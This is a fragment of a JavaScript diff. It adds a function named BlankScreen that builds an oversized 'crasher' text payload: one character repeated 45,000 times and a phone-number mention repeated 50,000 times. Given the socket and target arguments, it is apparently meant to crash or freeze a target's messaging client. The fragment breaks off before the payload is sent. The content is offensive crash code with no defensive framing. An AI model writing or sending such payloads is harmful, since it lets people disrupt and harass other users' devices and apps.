@@ -1,3 +1,5 @@
+const crypto = require('crypto');
+
 async function BlankScreen(sock, target, ptcp = false) {
         let virtex =
           "Silvetras Crasher͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
